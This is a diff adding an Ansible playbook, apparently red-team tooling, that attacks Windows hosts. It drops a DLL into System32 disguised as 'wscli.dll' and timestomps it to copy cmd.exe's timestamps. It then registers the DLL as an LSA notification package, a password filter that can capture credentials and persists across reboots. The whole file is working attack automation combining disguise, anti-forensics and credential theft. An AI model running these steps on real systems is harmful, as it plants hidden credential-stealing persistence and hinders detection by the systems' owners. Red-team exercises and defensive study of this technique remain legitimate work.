@@ -1,0 +1,31 @@
+---    
+- name: Copy libredteam.dll to System32 directory
+  ansible.windows.win_copy:
+    src: filter.dll
+    dest: C:\Windows\System32\wscli.dll
+  register: copy_result
+
+- name: timestomp dll
+  win_shell: |
+    $source = Get-Item "C:\Windows\System32\cmd.exe"
+    $destination = Get-Item "C:\Windows\System32\wscli.dll"
+    $destination.CreationTime = $source.CreationTime
+    $destination.LastAccessTime = $source.LastAccessTime
+    $destination.LastWriteTime = $source.LastWriteTime
+  args:
+    executable: powershell
+  when: copy_result is changed
+
+- name: Get current LSA notification packages
+  ansible.builtin.win_shell: |
+    (Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa')."Notification Packages"
+  register: current_notification_packages
+
+- name: Add redteam to LSA notificationPackages registry key
+  win_regedit:
+    path: HKLM:\SYSTEM\CurrentControlSet\Control\Lsa
+    name: "Notification Packages"
+    data: "{{ current_notification_packages.stdout_lines + ['wscli'] | unique}}"
+    datatype: multistring
+    state: present
+  register: registry_modification
